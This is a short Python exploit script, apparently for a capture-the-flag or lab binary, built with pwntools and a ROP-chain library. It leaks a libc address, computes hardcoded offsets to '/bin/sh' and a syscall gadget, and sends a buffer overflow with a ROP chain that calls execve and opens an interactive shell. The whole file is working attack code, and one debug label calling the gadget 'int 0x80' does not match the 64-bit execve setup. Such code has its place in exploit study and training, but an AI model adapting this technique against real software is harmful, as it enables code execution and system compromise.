#TODO replace pwn tools with the functions of standard library
from pwn import *
from ropchain import *
import os

binary = './a.out'
lib = './libc.so.6'
os.environ['LD_PRELOAD'] = lib
p = process(binary)

libropchain.setArch(libropchain.Arch.AMD64)
libropchain.setLoader(libropchain.Loader.RPP)

libc_stdout = u64(p.recv()[:6] + '\x00' * 2)
base = libc_stdout - 0x3c5620
binsh = base + 0x18cd17
syscall = base + 0x001bd9dc
regs = {rax: 0x3b, rdi: binsh, rsi: 0x0, rdx: 0x0}
print("libc base: %s" % hex(base))
print("int 0x80: %s" % hex(syscall))
print("binsh: %s" % hex(binsh))

rop = solve(regs, lib, base, set())
rop.dump()

payload = ''
payload += 'A' * 0x100 + 'BBBBBBBB'
payload += rop.payload()
payload += p64(syscall)

p.send(payload)

p.interactive()
